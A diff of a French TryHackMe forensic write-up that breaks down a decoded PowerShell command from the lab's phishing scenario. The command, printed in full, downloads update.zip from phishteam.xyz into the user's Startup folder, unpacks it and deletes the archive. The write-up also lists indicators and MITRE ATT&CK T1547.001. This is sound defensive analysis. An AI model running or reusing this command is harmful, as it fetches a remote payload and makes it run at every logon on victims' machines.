@@ -68,9 +68,33 @@ réponse : JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnK
 
 ![Tryhackme](00-Images/base64decode.png)
 
-$app=[Environment]::GetFolderPath('ApplicationData') : récupère le chemin %APPDATA% de l’utilisateur (C:\Users\<user>\AppData\Roaming).
-cd "...\Start Menu\Programs\Startup" : se place dans le dossier Démarrage de l’utilisateur. Tout ce qui s’y trouve est lancé automatiquement à chaque ouverture de session.
-iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip : télécharge (Invoke-WebRequest) une archive depuis le domaine de l’attaquant.
-Expand-Archive .\update.zip -DestinationPath . : décompresse l’archive directement dans le dossier Démarrage.
-rm update.zip : supprime l’archive pour laisser moins de traces.
+# Analyse de la commande PowerShell : persistance via le dossier Démarrage
+
+## Commande observée
+
+```powershell
+$app=[Environment]::GetFolderPath('ApplicationData');cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"; iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip; Expand-Archive .\update.zip -DestinationPath .; rm update.zip;
+```
+
+## Décomposition
+
+| # | Commande | Action |
+|---|---|---|
+| 1 | `$app=[Environment]::GetFolderPath('ApplicationData')` | Récupère le chemin `%APPDATA%` de l'utilisateur (`C:\Users\<user>\AppData\Roaming`). |
+| 2 | `cd "$app\Microsoft\Windows\Start Menu\Programs\Startup"` | Se place dans le dossier Démarrage de l'utilisateur. Tout ce qui s'y trouve est lancé automatiquement à chaque ouverture de session. |
+| 3 | `iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip` | Télécharge (`Invoke-WebRequest`) une archive depuis le domaine de l'attaquant. |
+| 4 | `Expand-Archive .\update.zip -DestinationPath .` | Décompresse l'archive directement dans le dossier Démarrage. |
+| 5 | `rm update.zip` | Supprime l'archive pour laisser moins de traces. |
+
+## Résultat
+
+La charge contenue dans `update.zip` s'exécutera **à chaque connexion de l'utilisateur** : c'est un mécanisme de **persistance**.
+
+## Éléments utiles pour l'investigation
+
+- **Domaine malveillant** : `phishteam.xyz` → à rechercher dans les Event ID 22 (DNS) et dans le pcap.
+- **URL complète** : `http://phishteam.xyz/02dcf07/update.zip`
+- **Technique MITRE ATT&CK** : T1547.001 (Registry Run Keys / Startup Folder).
+- **Prochaine étape** : chercher les Event ID 11 (création de fichier) dans le dossier `Startup` pour identifier le fichier extrait du zip.
+
   
